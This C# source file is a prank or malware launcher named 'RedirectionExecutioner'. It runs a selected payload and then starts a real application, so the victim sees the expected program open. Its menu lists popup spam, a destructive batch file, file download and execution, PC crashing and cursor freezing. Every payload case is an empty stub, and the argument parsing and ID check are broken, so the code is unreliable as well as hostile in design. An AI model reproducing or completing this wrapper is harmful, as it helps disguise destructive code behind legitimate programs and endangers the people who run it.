// Author: Dashie
// Version: 1.0

using System;
using System.Linq;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("RedirectionExecutioner")]
[assembly: AssemblyDescription("Kvinne Kraft")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Dashies Softwaries")]
[assembly: AssemblyProduct("RedirectionExecutioner")]
[assembly: AssemblyCopyright("Copyright © Dashies Softwaries 2020")]
[assembly: AssemblyTrademark("KvinneKraft")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("36e9d7c6-20f9-4f81-91a9-ae818445ee76")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace RedirectionExecutioner
{
    public class DashOS
    {
	readonly static List<string> TTypes = new List<string>() 
	{ 
	    "(.)", "(?)", 
	    "(!)", "(-)",
	    "",
	};

	public enum Types
	{
	    PROGRESS = 0, INFORMATION = 1, 
	    WARNING = 2, ERROR = 3, NONE = 4,
	};

	public static void Print(string data, Types type = Types.INFORMATION) => Console.WriteLine($"{TTypes[(int)type]}: {data.Replace("/n", $"\r\n{type}")}");
    };

    public class PayDay : DashOS
    {
	public static Dictionary<string, int> PayloadDB = new Dictionary<string, int>()
	{
	    { "popupspam", 1 },
	    { "custompopup", 2 },
	    { "destructivebatchfile", 3 },
	    { "downloadspecificfiletospecificfolder", 4 },
	    { "executespecificfile", 5 },
	    { "crashpc", 6 },
	    { "freezecursor", 7 },
    	    { "nomoveinjector", 8 },
	};

	public static bool CheckPayloadExistence(string name)
	{
	    return PayloadDB.ContainsKey(name);
	}

	public static void ExecutePayload(string name)
	{
	    if (!PayloadDB.ContainsKey(name.ToLower()))
	    {
		throw new Exception("PAYLOAD NOT FOUND!");
	    };

	    int ID = PayloadDB[name];

	    if (PayloadDB.Keys.Count > ID || PayloadDB.Keys.Count < ID)
	    {
		throw new Exception("INVALID ID RECEIVED!");
	    };

	    switch (ID)
	    {
		case 1:
		    // Popup Spammer
		    break;
		case 2:
		    // Custom Popup
		    break;
		case 3:
		    // Destructive Batch File
		    break;
		case 4:
		    // Download Specific File to Specific Folder
		    break;
		case 5:
		    // Execute Specific File
		    break;
		case 6:
		    // Crash PC 
		    break;
		case 7:
		    // Freeze Cursor
		    break;
		case 8:
		    // No Move Injector
		    break;
	    };
	}
    };

    public class Program : PayDay
    {
	private static string RemoveDash(string str) => str.Replace("-", "");
	
	static void Main(string[] _)
	{
	    void ErrorMessage()
	    {
		Print($@"You must include ""---redirect:<filepath>"", ""--arguments:<arguments>"" and ""--payload:<payload id>""!", Types.ERROR);
		Print($@"For help include ""--help""", Types.INFORMATION);
	    };

	    Dictionary<string, string> args = new Dictionary<string, string>();

	    foreach (string arg in _.ToList())
	    {
		string[] arr = arg.Split(':');

		if (arr.Length == 2)
		{
		    args.Add(RemoveDash(arr[0].ToLower()), arr[1]);
		}

		else
		{
		    ErrorMessage();
		    return;
		};
	    };

	    if (args.ContainsKey("help"))
	    {
		Console.WriteLine
		(
		    new string[]
		    {
			"Here are some helpful arguments my frend.",
			"--redirect     > The application that you want to execute after running the payload.",
			"--arguments    > The arguments that should be given to the above application.",
			"--payload      > You can see a list of payloads with the bellow.",
			"--payload-list > Shows a list of available payloads.",
			"--async        > Run all of the code asynchronously.",
			"------------------------------------------"
		    }    
		);

		return;
	    }

	    else if (args.ContainsKey("payload list"))
	    {

		Console.WriteLine
		(
		    new string[]
		    {
			"Here are some usable payloads, ready for take-off!",
			"(1): Popup Spammer > popupspam",
			"(2): Custom Popup  > custompopup",
			"(3): Batch Boom    > destructivebatchfile",
			"(4): Download File > downloadspecificfiletospecificfolder",
			"(5): Run File      > executespecificfile",
			"(6): Crash PC      > crashpc",
			"(7): Freeze Cursor > frreezecursorr",
			"(8): No Move       > nomoveinjector",
			"------------------------------------------"
		    }

		/*
	    { "popupspam", 1 },
	    { "custompopup", 2 },
	    { "destructivebatchfile", 3 },
	    { "downloadspecificfiletospecificfolder", 4 },
	    { "executespecificfile", 5 },
	    { "crashpc", 6 },
	    { "freezecursor", 7 },
    	    { "nomoveinjector", 8 },		     
		*/
		);

		return;
	    }

	    else if (!args.ContainsKey("redirect") || !args.ContainsKey("arguments") || !args.ContainsKey("payload"))
	    {
		ErrorMessage();
		return;
	    };

	    // Execute our code and then redirect to redirect and arguments.
	    
	    void StartProcess()
	    {
		try
		{
		    ExecutePayload(args["payload"]);

		    using (var process = new Process())
		    {
			process.StartInfo = new ProcessStartInfo()
			{
			    Arguments = args["arguments"],
			    FileName = args["redirect"],
			};

			process.Start();
		    };
		}

		catch
		{
		    Console.WriteLine("The application has stopped working.  Close now by pressing any key.");
		    Console.ReadKey();

		    Environment.Exit(-1);
		};
	    };

	    if (args.ContainsKey("async"))
	    {
		Thread thread = new Thread(() => StartProcess()) { IsBackground = true };

		thread.Start();
		thread.Join();

		return;
	    };

	    StartProcess();
	}
    };
};
